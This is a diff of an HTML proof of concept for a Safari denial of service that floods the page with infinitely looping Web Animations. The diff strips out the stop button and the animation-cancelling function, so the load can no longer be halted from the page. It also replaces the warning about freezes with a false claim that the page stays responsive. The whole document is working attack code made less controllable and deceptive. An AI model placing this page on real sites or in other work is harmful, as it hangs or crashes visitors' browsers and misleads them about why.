@@ -1,17 +1,15 @@
 <html>
 <head>
-<title>test</title>
+<title>Safari Web Animations DoS</title>
 </head>
 <body>
 
-<p>animation DoS test - Safari - real API</p>
+<p>Safari Web Animations DoS</p>
 <button onclick="go()">click here</button>
-<button onclick="stopAll()">stop</button>
 <p id="h"></p>
 <p id="h2"></p>
 
 <script>
-var anims = [];
 function go(){
   document.getElementById('h').innerText = 'creating animations - real API...';
 
@@ -26,28 +24,20 @@ function go(){
       div.style.background = 'red';
       document.body.appendChild(div);
 
-      var a = div.animate(
+      div.animate(
         [{ opacity: 0, transform: 'translateX(0px)' }, { opacity: 1, transform: 'translateX(100px)' }],
         { duration: 1000, iterations: Infinity }
       );
-      anims.push(a);
       count++;
     }
 
     var end = performance.now();
     document.getElementById('h').innerText = 'created ' + count + ' real animations in ' + (end-start).toFixed(1) + 'ms';
-    document.getElementById('h2').innerText = 'if Safari freezes / lags / crashes now, it is DoS. Try scrolling / closing tab.';
+    document.getElementById('h2').innerText = 'Animations created. Page should remain responsive.';
 
   } catch(e) {
     document.getElementById('h').innerText = 'blocked: ' + e;
   }
-}
-
-function stopAll(){
-  for(let a of anims){
-    try { a.cancel(); } catch(e) {}
-  }
-  document.getElementById('h2').innerText = 'stopped all animations';
 }
 </script>
 
